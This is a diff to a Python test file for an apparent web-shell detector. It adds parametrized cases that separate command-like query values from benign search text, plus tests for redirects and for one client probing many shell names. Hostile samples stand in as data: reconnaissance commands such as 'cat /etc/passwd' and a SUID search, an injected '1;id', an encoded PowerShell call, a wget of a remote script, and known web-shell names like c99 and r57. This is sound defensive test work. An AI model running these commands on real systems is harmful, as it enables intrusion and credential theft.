@@ -113,7 +113,10 @@ def test_hidden_extensions_are_scripts():
     ("cmd", "whoami", True), ("x", "uname -a", True), ("q", "cat /etc/passwd", True), ("c", "id", True),
     ("p", "cmd.exe /c dir C:\\", True), ("a", "powershell -enc SQBFAFgA", True), ("f", "1;id", True),
     ("sort", "id", False), ("type", "echo", False), ("cat", "books", False), ("lang", "dir", False),
-    ("q", "how to use ls", False), ("page", "net", False), ("search", "whoami command meaning", True),
+    ("q", "how to use ls", False), ("page", "net", False), ("search", "whoami command meaning", False),
+    ("q", "type 2 diabetes", False), ("q", "last 30 days", False), ("q", "find 5 star hotels", False),
+    ("q", "more -info", False), ("q", "copy of invoice", False), ("cmd", "type C:/boot.ini", True),
+    ("q", "find / -perm -4000", True), ("q", "wget http://192.0.2.9/x.sh", True), ("cmd", "ls", True),
 ])
 def test_command_parameters_are_typed_by_program_and_operand(name, value, command):
     assert bool(command_in(name, value)) is command
@@ -141,6 +144,23 @@ def test_command_parameters_are_typed_by_program_and_operand(name, value, comman
 def test_hard_benign_lookalikes_are_not_reported(events):
     _rule, out = run(events())
     assert out == []
+
+
+def test_a_redirect_is_not_an_answer():
+    events = history() + [req(0, "/uploads/x.php?cmd=id", status=302), req(1, "/uploads/y.php?cmd=id", status=301)]
+    _rule, out = run(events)
+    assert out == []
+
+
+def test_one_client_probing_many_answered_script_names_is_one_roll_up_at_lead(tmp_path):
+    names = ["shell", "cmd", "c99", "r57", "wso", "b374k", "up", "x"]
+    probes = [req(i * 0.1, f"/uploads/{name}.php?cmd=whoami", src="198.51.100.66") for i, name in enumerate(names)]
+    operator = [req(30, "/media/s.php?c=id")]
+    _rule, out = run(history() + probes + operator)
+    clean(out)
+    roll = [m for m in out if "198.51.100.66 requested 8 distinct scripts" in m.claim]
+    assert len(roll) == 1 and roll[0].proposed_lane == "lead" and len(out) == 2
+    assert next(m for m in out if m is not roll[0]).group_key == '["web01", "/media/s.php"]'
 
 
 def test_missing_fields_are_counted_never_a_clean_no_match():
